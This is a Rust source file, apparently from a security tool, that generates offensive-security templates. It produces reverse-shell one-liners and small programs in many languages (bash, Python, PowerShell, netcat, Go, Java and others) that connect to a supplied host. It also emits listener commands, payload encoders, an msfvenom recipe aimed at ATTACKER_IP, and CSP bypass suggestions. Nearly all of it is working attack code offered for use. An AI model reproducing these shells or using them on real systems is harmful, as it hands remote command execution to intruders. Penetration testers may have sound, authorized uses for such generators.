//! Deterministic offensive-security generators (reverse shells, listeners, CSP analysis).
//! Authorized testing only — gated by account ToS + Security Researcher tier at the command layer.

use serde_json::{json, Value};

fn shell_path<'a>(shell: Option<&'a str>, default: &'a str) -> &'a str {
    shell.filter(|s| !s.is_empty()).unwrap_or(default)
}

/// One-liner reverse shells for common languages (no network I/O — template only).
pub fn reverse_shell(language: &str, host: &str, port: u16, shell: Option<&str>) -> Result<String, String> {
    let lang = language.to_lowercase().replace([' ', '-'], "_");
    let h = host.trim();
    if h.is_empty() {
        return Err("host is required".into());
    }
    if port == 0 {
        return Err("port must be > 0".into());
    }

    let out = match lang.as_str() {
        "bash" | "sh" => format!(
            "bash -i >& /dev/tcp/{h}/{port} 0>&1"
        ),
        "python" | "python3" | "py" => format!(
            r#"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{h}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["{sh}","-i"])'"#,
            sh = shell_path(shell, "/bin/bash")
        ),
        "powershell" | "ps1" => format!(
            r#"$c=New-Object Net.Sockets.TCPClient("{h}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}"#
        ),
        "php" => format!(
            r#"php -r '$s=fsockopen("{h}",{port});$proc=proc_open("{sh} -i",array(0=>$s,1=>$s,2=>$s),$pipes);'"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "ruby" | "rb" => format!(
            r#"ruby -rsocket -e 'f=TCPSocket.open("{h}",{port}).to_i;exec({{stdin:f,stdout:f,stderr:f}}, "{sh}","-i"'"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "perl" | "pl" => format!(
            r#"perl -e 'use Socket;$i="{h}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{sh} -i");'"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "nc" | "netcat" => format!("nc -e {sh} {h} {port}", sh = shell_path(shell, "/bin/sh")),
        "ncat" => format!("ncat -e {sh} {h} {port}", sh = shell_path(shell, "/bin/sh")),
        "node" | "nodejs" | "javascript" => format!(
            r#"node -e 'require("child_process").spawn("{sh}",[],{{stdio:[require("net").connect({port},"{h}"),require("net").connect({port},"{h}"),require("net").connect({port},"{h}")]}})'"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "go" | "golang" => format!(
            r#"// go run revshell.go — authorized lab use only
package main
import("net";"os/exec")
func main(){{c,_:=net.Dial("tcp","{h}:{port}");cmd:=exec.Command("{sh}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "rust" | "rs" => format!(
            r#"// cargo run — TCP reverse shell stub (authorized lab)
use std::{{io::{{self,Read,Write}},net::TcpStream,process::Command}};
fn main() -> io::Result<()> {{
  let mut s = TcpStream::connect("{h}:{port}")?;
  let mut cmd = Command::new("{sh}"); cmd.stdin(s.try_clone()?); cmd.stdout(s.try_clone()?); cmd.stderr(s); cmd.spawn()?.wait()?;
  Ok(())
}}"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "csharp" | "cs" => format!(
            r#"// csc /out:rev.exe && rev.exe
using System; using System.Net.Sockets; using System.Diagnostics;
class R {{ static void Main() {{
  var c=new TcpClient("{h}",{port}); var p=new Process{{StartInfo=new ProcessStartInfo("{sh}"){{RedirectStandardInput=true,RedirectStandardOutput=true,RedirectStandardError=true,UseShellExecute=false}}}};
  p.Start(); c.GetStream().CopyTo(p.StandardInput.BaseStream);
}}}}"#,
            sh = shell_path(shell, "cmd.exe")
        ),
        "java" => format!(
            r#"// javac Rev.java && java Rev
import java.io.*; import java.net.*;
public class Rev {{ public static void main(String[] a) throws Exception {{
  Socket s=new Socket("{h}",{port}); Process p=Runtime.getRuntime().exec("{sh}");
  new Thread(()->pipe(p.getInputStream(),s.getOutputStream())).start();
  pipe(s.getInputStream(),p.getOutputStream());
}} static void pipe(InputStream i,OutputStream o) throws IOException {{ byte[] b=new byte[1024]; int n; while((n=i.read(b))>0) o.write(b,0,n); }} }}"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "awk" => format!(r#"awk 'BEGIN {{s="/inet/tcp/0/{h}/{port}"; while(1) {{print |& s; if((s |& getline c)>0) print c |& "/bin/sh"; close(s)}}}}'"#),
        "lua" => format!(
            r#"lua -e 'local h="{h}" local p={port} local s=assert(require("socket").tcp()); s:connect(h,p); os.execute("{sh} -i <&3 >&3 2>&3")'"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        "telnet" => format!(r#"TF=$(mktemp -u); mkfifo $TF && telnet {h} {port} 0<$TF | {sh} 1>$TF 2>&1"#, sh = shell_path(shell, "/bin/sh")),
        "openssl" => format!(
            r#"mkfifo s; {sh} < s | openssl s_client -quiet -connect {h}:{port} > s 2>/dev/null; rm s"#,
            sh = shell_path(shell, "/bin/sh")
        ),
        other => return Err(format!("unsupported language: {other}. Try: bash, python, powershell, php, ruby, nc, node, go, rust, java, csharp")),
    };
    Ok(out)
}

pub fn listener_config(kind: &str, host: &str, port: u16) -> Result<String, String> {
    let k = kind.to_lowercase();
    let bind = if host.is_empty() || host == "0.0.0.0" { String::new() } else { format!(" -s {host}") };
    Ok(match k.as_str() {
        "nc" | "netcat" => format!("nc -lvnp {port}{bind}"),
        "ncat" => format!("ncat -lvnp {port}{bind}"),
        "socat_tcp" | "socat" => format!("socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"),
        "socat_udp" => format!("socat UDP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sane"),
        "msf" | "metasploit" => format!(
            "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {port}; run\"",
            lhost = if host.is_empty() { "YOUR_IP".to_string() } else { host.to_string() }
        ),
        "pwncat" => format!("pwncat-cs -lp {port}"),
        other => return Err(format!("unknown listener: {other}. Use nc, ncat, socat_tcp, socat_udp, msf, pwncat")),
    })
}

pub fn encode_payload(payload: &str, encoding: &str) -> Result<Value, String> {
    let enc = encoding.to_lowercase();
    Ok(match enc.as_str() {
        "base64" => json!({ "encoding": "base64", "output": base64_encode(payload) }),
        "url" | "urlencode" => json!({ "encoding": "url", "output": urlencoding::encode(payload) }),
        "hex" => json!({
            "encoding": "hex",
            "output": payload.bytes().map(|b| format!("{b:02x}")).collect::<String>()
        }),
        "double_url" => {
            let once = urlencoding::encode(payload);
            json!({ "encoding": "double_url", "output": urlencoding::encode(&once) })
        }
        other => return Err(format!("unsupported encoding: {other} (base64, url, hex, double_url)")),
    })
}

fn base64_encode(s: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    STANDARD.encode(s.as_bytes())
}

pub fn shellcode_recipe(platform: &str, arch: &str, payload: &str) -> Value {
    let plat = platform.to_lowercase();
    let a = arch.to_lowercase();
    let pay = if payload.is_empty() { "shell_reverse_tcp" } else { payload };
    let msf = format!(
        "msfvenom -p {}/{} LHOST=ATTACKER_IP LPORT=4444 -f {} -o payload.bin",
        plat,
        pay,
        match a.as_str() {
            "x64" | "amd64" => "exe",
            "x86" | "i386" => "exe",
            "elf" => "elf",
            "macho" => "macho",
            _ => "raw",
        }
    );
    json!({
        "platform": plat,
        "arch": a,
        "payload": pay,
        "msfvenom": msf,
        "note": "Run msfvenom locally on your lab machine — this IDE does not emit executable shellcode bytes.",
        "alternatives": [
            "nasm -f elf64 shell.asm && ld shell.o -o shell",
            "donut for .NET assembly loaders (authorized red team labs)",
        ]
    })
}

/// Parse CSP header and suggest bypass research angles (static analysis — not a full gadget DB).
pub fn analyze_csp(header: &str) -> Value {
    let mut directives: std::collections::BTreeMap<String, Vec<String>> = std::collections::BTreeMap::new();
    for part in header.split(';') {
        let p = part.trim();
        if p.is_empty() {
            continue;
        }
        let mut it = p.split_whitespace();
        if let Some(name) = it.next() {
            directives.insert(name.to_lowercase(), it.map(|s| s.to_string()).collect());
        }
    }

    let mut weaknesses: Vec<String> = Vec::new();
    let mut suggestions: Vec<String> = Vec::new();

    let script_src = directives.get("script-src").cloned().unwrap_or_default();
    let default_src = directives.get("default-src").cloned().unwrap_or_default();
    let base_uri = directives.get("base-uri").cloned().unwrap_or_default();

    if script_src.iter().any(|s| s == "'unsafe-inline'") {
        weaknesses.push("script-src allows 'unsafe-inline' — inline event handlers / tags may execute".into());
        suggestions.push("Try inline <script>, onerror=, or javascript: URIs if reflected input lands in HTML.".into());
    }
    if script_src.iter().any(|s| s == "'unsafe-eval'") {
        weaknesses.push("script-src allows 'unsafe-eval' — eval/Function/ setTimeout(string) may be reachable".into());
    }
    if script_src.iter().any(|s| s.starts_with("data:") || s == "data:") {
        weaknesses.push("data: allowed in script-src — data: URI scripts may bypass filters".into());
    }
    if !script_src.is_empty() && script_src.iter().any(|s| s.contains("*") || s.ends_with(":*")) {
        weaknesses.push("Wildcard or broad host in script-src — JSONP endpoints on allowed origins".into());
        suggestions.push("Hunt JSONP callbacks on whitelisted domains (classic CSP bypass).".into());
    }
    if base_uri.is_empty() || base_uri.iter().any(|s| s == "*") {
        weaknesses.push("base-uri missing or permissive — <base href> injection may retarget relative scripts".into());
    }
    if default_src.is_empty() {
        weaknesses.push("No default-src — missing directives may fall back to permissive behavior in older browsers".into());
    }
    if script_src.iter().any(|s| s.contains("cdn.") || s.contains("googleapis") || s.contains("cloudflare")) {
        suggestions.push("Check known JSONP / angular bypass gadgets on whitelisted CDNs (PortSwigger CSP cheat sheet).".into());
    }
    if weaknesses.is_empty() {
        suggestions.push("Strict CSP — focus on DOM clobbering, dangling markup, or script gadgets in allowed libraries.".into());
    }

    json!({
        "directives": directives,
        "weaknesses": weaknesses,
        "bypass_research": suggestions,
        "severity_hint": if weaknesses.len() >= 2 { "likely_bypassable" } else if weaknesses.is_empty() { "strict" } else { "review" },
    })
}
